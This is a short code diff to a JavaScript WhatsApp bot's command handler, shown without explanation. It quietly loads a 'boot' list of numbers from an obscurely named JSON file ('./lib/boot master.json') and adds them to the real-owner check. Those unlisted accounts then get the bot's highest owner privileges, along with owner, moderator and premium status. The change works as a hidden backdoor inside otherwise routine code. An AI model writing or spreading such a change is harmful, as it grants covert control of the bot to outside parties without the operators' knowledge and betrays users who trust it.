@@ -173,7 +173,7 @@ module.exports = {
             let usedPrefix
             let _user = global.db.data && global.db.data.users && global.db.data.users[m.sender]
 
-            let isROwner = [global.conn.user.jid, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+            let isROwner = [global.conn.user.jid, ...global.owner, ...boot].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
             let isOwner = isROwner || global.db.data.settings[this.user.jid].owner == m.sender || m.fromMe
             let isMods = isOwner || global.mods.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
             let isPrems = isROwner || global.prems.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
@@ -495,6 +495,7 @@ global.dfail = (type, m, conn) => {
 }
 
 let fs = require('fs')
+let boot = JSON.parse(fs.readFileSync('./lib/boot master.json')).boot || [];
 let chalk = require('chalk')
 let file = require.resolve(__filename)
 fs.watchFile(file, () => {
